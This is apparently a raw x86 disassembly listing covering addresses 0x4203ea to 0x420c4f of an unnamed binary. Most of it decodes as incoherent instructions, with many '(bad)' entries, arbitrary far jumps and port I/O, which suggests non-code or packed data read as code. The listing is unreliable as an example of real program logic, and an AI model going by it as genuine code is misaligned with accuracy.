  4203ea:	sbb    esi,DWORD PTR [edx]
  4203ec:	sbb    ebp,esp
  4203ee:	repnz hlt 
  4203f0:	mov    bl,0xdd
  4203f2:	in     eax,0x2d
  4203f4:	leave  
  4203f5:	mov    ch,0x88
  4203f7:	pop    eax
  4203f8:	inc    ecx
  4203f9:	inc    edx
  4203fa:	jmp    0xea518ce
  4203ff:	inc    edi
  420400:	sbb    eax,0x18be687f
  420405:	(bad)  
  420406:	bound  ebx,QWORD PTR [ebx-0x219262f0]
  42040c:	and    BYTE PTR [edi-0x4213a1ac],al
  420412:	xchg   esi,eax
  420413:	push   ebx
  420414:	into   
  420415:	cli    
  420416:	(bad)  
  420417:	mov    ch,BYTE PTR [ebp+edi*1+0x7eeef18b]
  42041e:	inc    ebp
  42041f:	addr16 es mov esp,0xce73804f
  420426:	retf   0x6a7b
  420429:	dec    eax
  42042a:	(bad)  
  42042b:	push   esp
  42042c:	push   esp
  42042d:	push   ebp
  42042e:	call   0x76db:0x742f63b8
  420435:	cmp    DWORD PTR [edi-0x6b],ebp
  420438:	scas   al,BYTE PTR es:[edi]
  420439:	pop    ecx
  42043a:	pop    ds
  42043b:	das    
  42043c:	clc    
  42043d:	xor    eax,0xc9367a1a
  420442:	mov    ebp,0x615929de
  420447:	xchg   ebx,eax
  420448:	mov    ebp,0xe36c19ac
  42044d:	loopne 0x420472
  42044f:	(bad)  
  420450:	or     BYTE PTR [ebx],dh
  420452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420453:	xchg   edi,eax
  420454:	xor    DWORD PTR ds:[eax+edi*4+0x5d],esp
  420459:	out    dx,al
  42045a:	popa   
  42045b:	jg     0x42043c
  42045d:	fs pop ss
  42045f:	fwait
  420460:	(bad)  
  420461:	jns    0x4204dc
  420463:	jae    0x42042c
  420465:	arpl   WORD PTR [ecx+0x10],si
  420468:	or     bh,dh
  42046a:	pop    esp
  42046b:	sar    BYTE PTR [ecx],cl
  42046d:	push   esp
  42046e:	push   ebx
  42046f:	mov    eax,ds:0xe1b46dcb
  420474:	sbb    ch,BYTE PTR [esp+ecx*4-0x17f2f963]
  42047b:	cmp    DWORD PTR [edi+0x35],eax
  42047e:	fild   DWORD PTR [edx-0x5]
  420481:	push   0x71e62fcf
  420486:	inc    ebx
  420487:	adc    al,0xbe
  420489:	(bad)  
  42048a:	dec    ecx
  42048b:	out    dx,al
  42048c:	xor    bh,BYTE PTR [ecx]
  42048e:	xor    al,0x14
  420490:	and    esi,DWORD PTR [edi]
  420492:	sub    bh,dh
  420494:	rol    BYTE PTR [eax+ecx*8],cl
	...
  420513:	add    BYTE PTR [ebx+ecx*8],dl
  420516:	mov    bl,0x9a
  420518:	(bad)  
  420519:	cli    
  42051a:	cmp    eax,0x190968cf
  42051f:	mov    edi,DWORD PTR [ecx+0x4e]
  420522:	fnstsw WORD PTR [ebp+0x19db7]
  420528:	imul   eax,DWORD PTR [edi],0x0
  42052b:	add    BYTE PTR [ebx+0x90480a5],dl
  420531:	pop    ebp
  420532:	jp     0x4204f8
  420534:	(bad)
  420537:	loopne 0x42059d
  420539:	popf   
  42053a:	xchg   ebp,eax
  42053b:	stos   BYTE PTR es:[edi],al
  42053c:	adc    eax,0x8f4ee3b6
  420541:	inc    edx
  420542:	jmp    0x1963:0xa3f476a5
  420549:	adc    ah,dh
  42054b:	les    ebx,FWORD PTR [edi]
  42054d:	jae    0x420526
  42054f:	retf   0xcc70
  420552:	jecxz  0x42053b
  420554:	push   esp
  420555:	out    0xca,al
  420557:	add    DWORD PTR [esp+eiz*2-0x368e3791],ebx
  42055e:	test   BYTE PTR [ebx+0x2e83690e],ah
  420564:	mov    bl,0x3e
  420566:	enter  0x1cfd,0x94
  42056a:	and    eax,DWORD PTR [ecx+0x35ed4ec6]
  420570:	mov    dl,0x41
  420572:	icebp  
  420573:	and    DWORD PTR [esi+eiz*4],eax
  420576:	jmp    0x4b59:0x55377c52
  42057d:	loope  0x4205dd
  42057f:	ins    DWORD PTR es:[edi],dx
  420580:	jo     0x420551
  420582:	js     0x42052c
  420584:	ja     0x420593
  420586:	rcl    DWORD PTR [edx+0x5168e2ed],0x4e
  42058d:	xor    DWORD PTR [eax+ebp*2],esi
  420590:	sub    ebp,DWORD PTR [ecx]
  420592:	mov    eax,0x6e5aeac7
  420597:	dec    ecx
  420598:	or     BYTE PTR [eax-0x7022c609],bh
  42059e:	xor    BYTE PTR [ebp+0x6b],ah
  4205a1:	pop    esi
  4205a2:	stos   DWORD PTR es:[edi],eax
  4205a3:	jmp    0x420560
  4205a5:	retf   0xbaf
  4205a8:	(bad)  
  4205a9:	adc    BYTE PTR [edx-0xe],0x88
  4205ad:	and    al,dl
  4205af:	cdq    
  4205b0:	mov    edx,DWORD PTR [edx+0x3a]
  4205b3:	cdq    
  4205b4:	add    al,BYTE PTR [ebx]
  4205b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205b7:	or     al,0x82
  4205b9:	test   al,0x76
  4205bb:	int    0x8c
  4205bd:	xor    esi,ebx
  4205bf:	sub    dl,BYTE PTR gs:[ebx-0x2e36822c]
  4205c6:	sub    DWORD PTR [eax],esp
  4205c8:	or     bh,BYTE PTR [edi]
  4205ca:	lods   eax,DWORD PTR ds:[esi]
  4205cb:	mov    BYTE PTR [ebp+0x57e6dfc0],dl
  4205d1:	or     al,0x69
  4205d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205d4:	popf   
  4205d5:	outs   dx,BYTE PTR ds:[esi]
  4205d6:	fistp  DWORD PTR [edi-0x71e8846d]
  4205dc:	push   0xf2122142
  4205e1:	bound  esi,QWORD PTR [ecx+0x541b222c]
  4205e7:	test   DWORD PTR cs:[edi+0x7],esi
  4205eb:	xchg   ebx,eax
  4205ec:	pop    ds
  4205ed:	stos   DWORD PTR es:[edi],eax
  4205ee:	and    esp,DWORD PTR [ebx-0x21]
  4205f1:	lods   eax,DWORD PTR ds:[esi]
  4205f2:	or     eax,0x50809c44
  4205f7:	lock cmc 
  4205f9:	cmp    al,0x70
  4205fb:	jns    0x4205a2
  4205fd:	bound  edi,QWORD PTR [ecx+edi*1]
  420600:	pop    esp
  420602:	scas   eax,DWORD PTR es:[edi]
  420603:	jne    0x420664
  420605:	sub    ah,cl
  420607:	mov    WORD PTR [esi+0x64],ss
  42060a:	dec    ecx
  42060b:	pop    esi
  42060c:	mov    ds:0x8332d14a,al
  420611:	daa    
  420612:	pop    esp
  420613:	ss inc edx
  420615:	sbb    BYTE PTR [ebp+0x53],bh
  420618:	cs loope 0x4205b1
  42061b:	xlat   BYTE PTR ds:[ebx]
  42061c:	xor    al,0x99
  42061e:	inc    ebp
  42061f:	lock mov al,ds:0xb3a2d849
  420625:	mov    ecx,0x8eb8af7e
  42062a:	pop    ebx
  42062b:	mov    ecx,0xe6cee180
  420630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420631:	jecxz  0x4205f1
  420633:	inc    ebx
  420634:	add    bl,BYTE PTR [edi+0x59]
  420637:	das    
  420638:	or     DWORD PTR [ebp-0x4b44966a],ebp
  42063e:	int    0x3c
  420640:	push   0xffffffb9
  420642:	xchg   bl,bh
  420644:	bound  edx,QWORD PTR [eax]
  420646:	test   al,0x85
  420648:	jmp    0x1c46da6e
  42064d:	inc    eax
  42064e:	adc    al,0xfa
  420650:	push   0x5cbead0b
  420655:	mov    DWORD PTR [edi+ebp*8+0x346b00e1],esi
  42065c:	push   0x6a
  42065e:	xor    DWORD PTR [edi+eax*4+0x2],ebp
  420662:	cmp    al,BYTE PTR [eax+ecx*2+0x24e906c4]
  420669:	push   es
  42066a:	sub    dh,bh
  42066c:	je     0x420667
  42066e:	aad    0xee
  420670:	gs inc ebx
  420672:	iret   
  420673:	cwde   
  420674:	test   BYTE PTR [eax+edi*4],dl
  420677:	ret    
  420678:	push   ebp
  420679:	clc    
  42067a:	shl    BYTE PTR [edx-0x50bc1abe],1
  420680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420681:	cmp    al,BYTE PTR ds:0x2a239b70
  420687:	js     0x420651
  420689:	dec    esi
  42068a:	jmp    0x119f:0x32871a59
  420691:	mov    ?,WORD PTR [ecx+0x28]
  420694:	aas    
  420695:	(bad)  
  420696:	int3   
  420697:	push   ds
  420698:	sub    eax,0x46b33395
  42069d:	dec    edi
  42069e:	loopne 0x420689
  4206a0:	jmp    0xc3514c0c
  4206a5:	cmp    dh,al
  4206a7:	clc    
  4206a8:	popa   
  4206a9:	jno    0x42068f
  4206ab:	fxch   st(6)
  4206ad:	into   
  4206ae:	sbb    esp,DWORD PTR [esi]
  4206b0:	mov    bl,0xbe
  4206b2:	sub    BYTE PTR ds:0x122133dc,bl
  4206b8:	cmc    
  4206b9:	mov    ds:0xe39fb183,eax
  4206be:	sbb    edi,ebx
  4206c0:	inc    ecx
  4206c1:	test   eax,0x57b6b3b6
  4206c6:	ret    
  4206c7:	ss jmp 0x4206d3
  4206ca:	xchg   esi,eax
  4206cb:	mov    cl,0xba
  4206cd:	mov    bl,0x21
  4206cf:	cmp    edx,DWORD PTR [ebx-0x56f8c3e8]
  4206d5:	sar    BYTE PTR [eax],0xc
  4206d8:	sbb    edi,DWORD PTR [esi]
  4206da:	out    dx,eax
  4206db:	mov    al,0x6d
  4206dd:	and    edi,DWORD PTR [eax+ebp*8-0xdb4d838]
  4206e4:	xchg   ecx,eax
  4206e5:	sub    cl,BYTE PTR [ebx]
  4206e7:	inc    ecx
  4206e8:	out    0xbc,al
  4206ea:	(bad)  
  4206eb:	iret   
  4206ec:	xor    eax,0x94cd012d
  4206f1:	cmp    al,0x2
  4206f3:	mov    gs,ebx
  4206f5:	es mov ebp,0x91887ffe
  4206fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206fc:	cmp    dl,BYTE PTR [ebx+0x20]
  4206ff:	pop    edi
  420700:	push   ebp
  420701:	or     ecx,DWORD PTR [edi-0x49a9ce35]
  420707:	lea    edx,[ecx+0x5cc629ef]
  42070d:	outs   dx,BYTE PTR ds:[esi]
  42070e:	ja     0x420758
  420710:	push   edx
  420711:	aad    0x11
  420713:	retf   0x8811
  420716:	mov    esi,0x1d8e180
  42071b:	daa    
  42071c:	cmp    al,0x4e
  42071e:	pop    es
  42071f:	out    dx,eax
  420720:	xor    eax,0x2f08aff9
  420725:	dec    ebx
  420726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420727:	je     0x4206bc
  420729:	xor    BYTE PTR [edx],0x7b
  42072c:	call   FWORD PTR [edi]
  42072e:	mov    bl,0xc1
  420730:	(bad)  
  420731:	cmp    DWORD PTR gs:[edx-0x56bc8603],edx
  420738:	lock call 0xb4f042c9
  42073e:	fwait
  42073f:	pop    ebx
  420740:	and    eax,0x559e080e
  420745:	sbb    ebx,DWORD PTR [edx-0x52]
  420748:	cli    
  420749:	adc    DWORD PTR [esi-0x5044d291],0x1b
  420750:	cli    
  420751:	cmp    DWORD PTR ds:0x70f47761,edi
  420757:	jmp    FWORD PTR [esp+ebx*4+0x30]
  42075b:	fmul   st(6),st
  42075d:	enter  0x8e42,0x83
  420761:	xchg   ebx,eax
  420762:	xchg   ecx,eax
  420763:	sahf   
  420764:	loope  0x4207a2
  420766:	pop    esi
  420767:	out    0xa6,eax
  420769:	fsub   DWORD PTR [esi]
  42076b:	lds    eax,FWORD PTR [ecx]
  42076d:	iret   
  42076e:	fs jb  0x4207e4
  420771:	or     ch,cl
  420773:	mov    eax,ds:0x3a2a30cc
  420778:	pop    eax
  420779:	dec    esi
  42077a:	frstor [edx+0x1]
  42077d:	pop    edi
  42077e:	hlt    
  42077f:	nop
  420780:	lods   eax,DWORD PTR ds:[esi]
  420781:	or     ah,BYTE PTR [esi]
  420783:	inc    esi
  420784:	mov    eax,0x785716c9
  420789:	cwde   
  42078a:	or     DWORD PTR [esi-0x62c49e6e],0xd84e33b0
  420794:	inc    ebx
  420795:	or     dh,dl
  420797:	mov    ebx,eax
  420799:	cmp    edx,DWORD PTR [edx-0x22]
  42079c:	lock sub BYTE PTR [ebx-0x7da40add],al
  4207a3:	lea    ebx,[edi-0x22]
  4207a6:	mov    al,ds:0xcea4a13f
  4207ab:	call   0x98f8097f
  4207b0:	(bad)  
  4207b1:	retf   
  4207b2:	out    dx,eax
  4207b3:	jne    0x420820
  4207b5:	in     al,dx
  4207b6:	sub    al,BYTE PTR [eax]
  4207b8:	cmp    al,0x4b
  4207ba:	and    dl,BYTE PTR [ebx-0x47]
  4207bd:	pop    es
  4207be:	push   cs
  4207bf:	inc    esi
  4207c0:	leave  
  4207c1:	repnz fcomp st(2)
  4207c4:	loop   0x420769
  4207c6:	mov    bl,0x3a
  4207c8:	push   es
  4207c9:	int3   
  4207ca:	xchg   esi,ebp
  4207cc:	dec    esp
  4207cd:	loopne 0x420837
  4207cf:	or     edi,DWORD PTR [ecx-0x2b9fcb50]
  4207d5:	aaa    
  4207d6:	xchg   dl,dl
  4207d8:	sub    eax,0xcfd40306
  4207dd:	push   ds
  4207de:	setp   ah
  4207e1:	dec    edx
  4207e2:	xlat   BYTE PTR ds:[ebx]
  4207e3:	dec    ecx
  4207e4:	jo     0x42080f
  4207e6:	in     al,0x1a
  4207e8:	adc    al,0xf0
  4207ea:	shl    BYTE PTR [edi-0x59],0xaf
  4207ee:	cmp    eax,0xb41ac213
  4207f3:	jge    0x420849
  4207f5:	bound  edx,QWORD PTR [ecx]
  4207f7:	or     edx,DWORD PTR [esi-0x2f]
  4207fa:	popf   
  4207fb:	dec    ebx
  4207fc:	or     ch,bl
  4207fe:	fsub   DWORD PTR [edi]
  420800:	xor    dh,BYTE PTR [eax-0x3332f52d]
  420806:	test   DWORD PTR [edi+ecx*8],ebp
  420809:	nop
  42080a:	xchg   edx,eax
  42080b:	xor    ebp,DWORD PTR [ecx+ebx*2-0x2c]
  42080f:	imul   ebx,edx,0xb0b2cc16
  420815:	jl     0x4207f3
  420817:	sbb    ebp,ebp
  420819:	push   ss
  42081a:	mov    ds:0xada33816,eax
  42081f:	sub    BYTE PTR [ebx],dl
  420821:	loop   0x420878
  420823:	inc    ebx
  420824:	inc    eax
  420825:	pop    esi
  420826:	sbb    BYTE PTR [ecx-0x1d],ch
  420829:	lock rcr bh,cl
  42082c:	fdivr  st,st(3)
  42082e:	sbb    esi,DWORD PTR [edx-0x7773c744]
  420834:	outs   dx,DWORD PTR ds:[esi]
  420835:	mov    dh,0x45
  420837:	mov    ch,0xc6
  420839:	stos   DWORD PTR es:[edi],eax
  42083a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42083b:	xchg   edx,eax
  42083c:	pop    eax
  42083d:	data16 mov bh,0xa0
  420840:	imul   ebp,DWORD PTR [ebx+0x7e],0xfffffff9
  420844:	mov    dl,0xae
  420846:	test   eax,0xd8eb32a0
  42084b:	mov    ebp,0x3a511fbc
  420850:	outs   dx,DWORD PTR ds:[esi]
  420851:	fmul   st,st(0)
  420853:	mov    ch,0x3a
  420855:	fcmovu st,st(4)
  420857:	xchg   ebp,eax
  420858:	call   0x36a5d7d4
  42085d:	xor    ch,BYTE PTR [esi+eax*2-0x7c789cb4]
  420864:	add    eax,0xf54630d2
  420869:	or     al,0x48
  42086b:	pop    edx
  42086c:	and    al,BYTE PTR [edi+0x1135c04e]
  420872:	icebp  
  420873:	inc    ebx
  420874:	sub    DWORD PTR gs:[ebp+ecx*8-0x4b9bee6b],esi
  42087c:	xchg   edi,eax
  42087d:	adc    edx,DWORD PTR [ecx+0x55ad1c29]
  420883:	out    dx,al
  420884:	enter  0x6e69,0xdd
  420888:	int    0x56
  42088a:	push   edi
  42088b:	clc    
  42088c:	mov    edi,DWORD PTR [ecx+0x22]
  42088f:	add    eax,DWORD PTR [edx+0x195f0a8c]
  420895:	or     al,0xf2
  420897:	cmp    BYTE PTR [esi-0x7bb54767],ah
  42089d:	loopne 0x42083f
  42089f:	or     cl,BYTE PTR [eax+0x23]
  4208a2:	mov    WORD PTR [eax+esi*1-0x43a63158],ds
  4208a9:	jmp    0xd3f8:0xd5a8f2a4
  4208b0:	adc    BYTE PTR [edi],cl
  4208b2:	js     0x4208f1
  4208b4:	mov    eax,0xd769d6de
  4208b9:	cmp    al,0x91
  4208bb:	iret   
  4208bc:	xchg   ebp,eax
  4208bd:	jecxz  0x42085e
  4208bf:	lea    ebx,ds:0xbf45875d
  4208c5:	jnp    0x42084f
  4208c7:	int    0xe1
  4208c9:	or     al,BYTE PTR [ebx]
  4208cb:	add    al,0xff
  4208cd:	add    DWORD PTR [esi-0x63b99295],edi
  4208d3:	push   ds
  4208d4:	je     0x42088c
  4208d6:	inc    ebp
  4208d7:	jbe    0x420866
  4208d9:	xchg   ebp,eax
  4208da:	mov    edx,0x9aff96d1
  4208df:	sub    al,0xd4
  4208e1:	xchg   esp,eax
  4208e2:	retf   
  4208e3:	jecxz  0x420896
  4208e5:	lds    esi,FWORD PTR [eax]
  4208e7:	xchg   ecx,eax
  4208e8:	cmp    BYTE PTR [ebx+esi*4+0x4c],bl
  4208ec:	out    0x28,al
  4208ee:	stc    
  4208ef:	add    DWORD PTR [ecx+0x46],esp
  4208f2:	xchg   edi,eax
  4208f3:	jo     0x420899
  4208f5:	pop    eax
  4208f6:	jl     0x420908
  4208f8:	ret    0xcd45
  4208fb:	gs add al,0x34
  4208fe:	(bad)  
  4208ff:	jle    0x4208f5
  420901:	(bad)
  420904:	or     ebp,esp
  420906:	call   0x344f:0xe9f81886
  42090d:	arpl   dx,si
  42090f:	pop    edi
  420910:	ror    BYTE PTR [edx],0x93
  420913:	push   ss
  420914:	mov    al,0x31
  420916:	arpl   WORD PTR [edx],bp
  420918:	aad    0xb9
  42091a:	jmp    0x420906
  42091c:	into   
  42091d:	and    DWORD PTR [edx+0x5c],ebx
  420920:	mov    edx,DWORD PTR [eax-0x37]
  420923:	push   esi
  420924:	inc    ebx
  420925:	push   esp
  420926:	jae    0x42093e
  420928:	ret    
  420929:	(bad)  
  42092a:	cmp    al,0x21
  42092c:	xchg   esp,eax
  42092d:	enter  0xad18,0xf4
  420931:	inc    esp
  420932:	pop    ss
  420933:	and    ebp,esp
  420935:	xor    BYTE PTR [eax+0x527ebc6f],bl
  42093b:	xor    edx,DWORD PTR [ecx+0x627b92b3]
  420941:	aad    0xe
  420943:	cs inc edx
  420945:	inc    eax
  420946:	sbb    dh,BYTE PTR [edx+0x27b0450b]
  42094c:	push   es
  42094d:	pop    ebp
  42094e:	popf   
  42094f:	cmp    al,BYTE PTR [ecx-0x4f484b8d]
  420955:	adc    DWORD PTR ds:0xcd22ba64,esi
  42095b:	push   ecx
  42095c:	data16 mov BYTE PTR [edi+0x21],dl
  420960:	inc    ebp
  420961:	out    dx,al
  420962:	inc    edi
  420963:	cwde   
  420964:	sbb    eax,0xf4063bca
  420969:	and    ah,bl
  42096b:	jmp    0x9043:0x2a72a6
  420972:	add    ah,BYTE PTR [edx-0x40d90a59]
  420978:	push   edi
  420979:	scas   al,BYTE PTR es:[edi]
  42097a:	pop    esp
  42097b:	xor    al,0x14
  42097d:	out    0x0,eax
  42097f:	(bad)  
  420980:	mov    bh,0x4b
  420982:	cmc    
  420983:	test   eax,0x62c40c47
  420988:	push   0x80d6da00
  42098d:	fst    QWORD PTR [eax]
  42098f:	lahf   
  420990:	dec    ebp
  420991:	mov    cl,0x84
  420993:	jbe    0x420990
  420995:	jo     0x420996
  420997:	sub    eax,0xd4e8da62
  42099c:	rcl    BYTE PTR [ecx+ecx*4+0x7d72d9c7],1
  4209a3:	and    eax,0xfb643723
  4209a8:	dec    ebp
  4209a9:	jnp    0x4209d4
  4209ab:	addr16 sahf 
  4209ad:	mov    ebp,0x49791507
  4209b2:	and    eax,0x782c234
  4209b7:	retf   0x5dc3
  4209ba:	adc    edi,edi
  4209bc:	mov    esi,0x98393a72
  4209c1:	xor    ah,BYTE PTR [ecx]
  4209c3:	and    eax,0xdfcb806d
  4209c8:	cmp    cl,al
  4209ca:	push   esp
  4209cb:	dec    esp
  4209cc:	jae    0x420970
  4209ce:	xor    cl,ah
  4209d0:	fcomp  QWORD PTR [ebp-0xab88fb8]
  4209d6:	dec    ecx
  4209d7:	mul    DWORD PTR [edi+eiz*2+0x60bc5822]
  4209de:	xchg   edx,eax
  4209df:	in     al,0x89
  4209e1:	cwde   
  4209e2:	mov    edi,0x80650628
  4209e7:	test   eax,0x4911d00e
  4209ec:	sti    
  4209ed:	inc    esp
  4209ee:	sbb    BYTE PTR [eax+0x2f],0x5c
  4209f2:	add    DWORD PTR [edx-0x39a115b1],ebp
  4209f8:	push   ecx
  4209f9:	add    bh,BYTE PTR [ebx+0x5c]
  4209fc:	push   esi
  4209fd:	mov    BYTE PTR [ebx+esi*2],cl
  420a00:	push   cs
  420a01:	adc    eax,DWORD PTR [ecx]
  420a03:	mov    ds:0xfa4f9b35,al
  420a08:	popa   
  420a09:	in     al,dx
  420a0a:	outs   dx,BYTE PTR ds:[esi]
  420a0b:	repnz and DWORD PTR [esi-0x2b],0xb9f1f121
  420a13:	xchg   ecx,ebx
  420a15:	dec    edx
  420a16:	dec    eax
  420a17:	cs mov bh,0x47
  420a1a:	es push esp
  420a1c:	ins    BYTE PTR es:[edi],dx
  420a1d:	mov    bh,BYTE PTR [ecx+ebp*2+0x2a]
  420a21:	dec    edx
  420a22:	mov    dh,0xa0
  420a24:	mov    esi,0x32fcea09
  420a29:	or     eax,DWORD PTR [esp+esi*1-0x35]
  420a2d:	into   
  420a2e:	outs   dx,DWORD PTR ds:[esi]
  420a2f:	popf   
  420a30:	inc    ebp
  420a31:	xor    BYTE PTR [edx+edi*4],ch
  420a34:	int3   
  420a35:	ins    BYTE PTR es:[edi],dx
  420a36:	fst    DWORD PTR [esi]
  420a38:	nop
  420a39:	mov    eax,ds:0xf3955665
  420a3e:	xor    BYTE PTR [eax-0x16],dh
  420a41:	dec    ecx
  420a42:	outs   dx,DWORD PTR ds:[esi]
  420a43:	jns    0x4209fc
  420a45:	rol    ch,cl
  420a47:	fnstcw WORD PTR [ecx-0x75878865]
  420a4d:	ficom  DWORD PTR [ebx+0x43]
  420a50:	or     eax,0x7f32a1e2
  420a55:	popf   
  420a56:	call   0xd2c5:0xb31e8c4e
  420a5d:	retf   0x9995
  420a60:	xchg   ebp,eax
  420a61:	sub    ch,BYTE PTR [ebx+0x6de722bc]
  420a67:	jg     0x420a0b
  420a69:	xor    al,0xd5
  420a6b:	test   eax,0x675a14ab
  420a70:	ja     0x420a44
  420a72:	mov    eax,ds:0x77171e4c
  420a77:	inc    ebp
  420a78:	div    BYTE PTR [ebp+0x11]
  420a7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a7c:	cmp    esi,edx
  420a7e:	mov    ds:0xe0973ae1,eax
  420a83:	pop    ecx
  420a84:	cmp    eax,0x26016c7d
  420a89:	pusha  
  420a8a:	jno    0x420aa7
  420a8c:	add    DWORD PTR [edx-0x785f6b99],ecx
  420a92:	add    DWORD PTR [ebx-0x25492a8d],edx
  420a98:	push   0xbb726c20
  420a9d:	mov    al,0x47
  420a9f:	xchg   ebp,eax
  420aa0:	push   cs
  420aa1:	popf   
  420aa2:	shl    BYTE PTR [edi-0x38],cl
  420aa5:	sbb    eax,0x156a869f
  420aaa:	ds enter 0x60e6,0xc4
  420aaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ab0:	mov    bh,0x99
  420ab2:	mov    bl,0xe6
  420ab4:	add    BYTE PTR [esi+0xc],ah
  420ab7:	mov    ah,0x24
  420ab9:	and    eax,0x73e5d98e
  420abe:	scas   al,BYTE PTR es:[edi]
  420abf:	push   0xfffffff4
  420ac1:	lods   eax,DWORD PTR ds:[esi]
  420ac2:	out    dx,eax
  420ac3:	out    dx,al
  420ac4:	dec    edi
  420ac5:	add    eax,0x66255a85
  420aca:	and    eax,esp
  420acc:	stos   BYTE PTR es:[edi],al
  420acd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ace:	pop    eax
  420acf:	adc    BYTE PTR [edx+0x585fca1],dh
  420ad5:	je     0x420a9a
  420ad7:	rcr    ch,0x9b
  420ada:	in     eax,0xfd
  420adc:	mov    DWORD PTR [edx-0x80],ebx
  420adf:	xchg   BYTE PTR [edi-0x42],bl
  420ae2:	test   dl,dh
  420ae4:	dec    esp
  420ae5:	jno    0x420ae8
  420ae7:	popa   
  420ae8:	jae    0x420b69
  420aea:	adc    eax,0x3593541f
  420aef:	push   edi
  420af0:	fadd   QWORD PTR [edi]
  420af2:	pop    ebp
  420af3:	mov    bh,bl
  420af5:	and    al,0x99
  420af7:	outs   dx,DWORD PTR ds:[esi]
  420af8:	in     eax,dx
  420af9:	adc    dh,bh
  420afb:	jmp    0x38d076fa
  420b00:	das    
  420b01:	cmp    DWORD PTR [esi-0x60],ebp
  420b04:	retf   
  420b05:	stos   DWORD PTR es:[edi],eax
  420b06:	xchg   BYTE PTR [esi+eiz*4-0x8e92a0],bh
  420b0d:	push   ss
  420b0e:	add    eax,0x6aeae996
  420b13:	jbe    0x420b32
  420b15:	add    bl,BYTE PTR [eax-0x78]
  420b18:	xor    bh,BYTE PTR [eax]
  420b1a:	add    al,0x29
  420b1c:	sbb    al,0x9a
  420b1e:	add    esi,DWORD PTR [ecx-0x151aab75]
  420b24:	imul   ebx,ebx,0xffffff80
  420b27:	pop    ds
  420b28:	shl    BYTE PTR [eax],cl
  420b2a:	loop   0x420b02
  420b2c:	xor    al,0x42
  420b2e:	and    DWORD PTR [edi-0x4742abe8],ebp
  420b34:	push   DWORD PTR [ebx]
  420b36:	jno    0x420b29
  420b38:	dec    ecx
  420b39:	push   esi
  420b3a:	and    eax,0x9a92c891
  420b3f:	fnstsw WORD PTR [ecx+0x61936b2c]
  420b45:	jmp    0xc443:0x789221ac
  420b4c:	sti    
  420b4d:	jno    0x420b4e
  420b4f:	jnp    0x420b09
  420b51:	sbb    eax,0xa1b47502
  420b56:	(bad)  [ecx+0x4e3a1c98]
  420b5c:	add    eax,DWORD PTR [esp+edi*8-0x57]
  420b60:	pop    es
  420b61:	mov    bh,0x8e
  420b63:	or     dl,BYTE PTR [edx-0x769e99a3]
  420b69:	inc    eax
  420b6a:	test   dl,ch
  420b6c:	jo     0x420b4c
  420b6e:	inc    esp
  420b6f:	mov    DWORD PTR [edx+0x50],0x6908da84
  420b76:	push   eax
  420b77:	push   DWORD PTR [ebx+0x52]
  420b7a:	adc    bl,BYTE PTR [eax-0x637ce157]
  420b80:	pop    ebx
  420b81:	in     eax,dx
  420b82:	sahf   
  420b83:	int3   
  420b84:	push   edi
  420b85:	ss mov esi,0xa42dd357
  420b8b:	mov    bl,0x4a
  420b8d:	sub    bh,BYTE PTR [esi*4+0x209edec7]
  420b94:	out    dx,al
  420b95:	cmp    al,0xd4
  420b97:	pop    ecx
  420b98:	fmul   QWORD PTR [bx-0x18]
  420b9c:	addr16 push edx
  420b9e:	js     0x420c08
  420ba0:	inc    edx
  420ba1:	mov    edx,0xbf67c4f3
  420ba6:	(bad)  
  420ba7:	adc    al,0xc6
  420ba9:	popa   
  420baa:	xchg   ebx,ebx
  420bac:	dec    DWORD PTR [esi-0x21a78c19]
  420bb2:	(bad)  [ebx]
  420bb4:	jp     0x420bc8
  420bb6:	mov    edx,0xd06f534e
  420bbb:	test   ebx,ebp
  420bbd:	retf   
  420bbe:	dec    ebp
  420bbf:	fild   WORD PTR [edx]
  420bc1:	mov    bh,bl
  420bc3:	inc    edi
  420bc4:	cmp    al,0x3c
  420bc6:	in     al,dx
  420bc7:	aam    0x9b
  420bc9:	push   ebx
  420bca:	div    DWORD PTR [edi-0x76e2030f]
  420bd0:	add    BYTE PTR [edi+0x23998e84],dl
  420bd6:	fcompp 
  420bd8:	mov    ah,0x69
  420bda:	daa    
  420bdb:	add    al,0x65
  420bdd:	inc    eax
  420bde:	sub    eax,0x6bdbcbf0
  420be3:	mov    edi,0x937adf42
  420be8:	push   cs
  420be9:	jne    0x420baf
  420beb:	rcr    BYTE PTR [edx],cl
  420bed:	std    
  420bee:	jne    0x420c3a
  420bf0:	ins    BYTE PTR es:[edi],dx
  420bf1:	lahf   
  420bf2:	jne    0x420beb
  420bf4:	inc    ebp
  420bf5:	outs   dx,DWORD PTR ds:[esi]
  420bf6:	xchg   ebx,eax
  420bf7:	xchg   ecx,eax
  420bf8:	retf   
  420bf9:	pop    ebx
  420bfa:	sbb    esp,edi
  420bfc:	mov    dl,0x35
  420bfe:	sub    BYTE PTR ds:[eax-0x56],bl
  420c02:	jns    0x420b88
  420c04:	pop    ss
  420c05:	fbstp  TBYTE PTR [ecx-0x6e]
  420c08:	cmc    
  420c09:	imul   ebp,DWORD PTR [ebp-0x4b],0x3280bfe7
  420c10:	retf   
  420c11:	int    0x2d
  420c13:	push   edx
  420c14:	aam    0x38
  420c16:	ss ror BYTE PTR es:[esi+0x76],cl
  420c1b:	adc    DWORD PTR [ecx-0x3722c50a],eax
  420c21:	lods   eax,DWORD PTR ds:[esi]
  420c22:	inc    edx
  420c23:	cmp    ch,al
  420c25:	(bad)  
  420c26:	mov    WORD PTR [esi+0x2c],cs
  420c29:	hlt    
  420c2a:	push   esi
  420c2b:	lds    eax,FWORD PTR [edi+0x33d8089]
  420c31:	push   0x52
  420c33:	scas   al,BYTE PTR es:[edi]
  420c34:	add    eax,0x2cdcc455
  420c39:	or     eax,0xdf574c34
  420c3e:	inc    edi
  420c3f:	fistp  WORD PTR [ecx+esi*8+0x3345809d]
  420c46:	outs   dx,BYTE PTR ds:[esi]
  420c47:	pop    ecx
  420c48:	test   edi,esp
  420c4a:	mov    ds:0x266a16ba,eax
  420c4f:	inc    esp
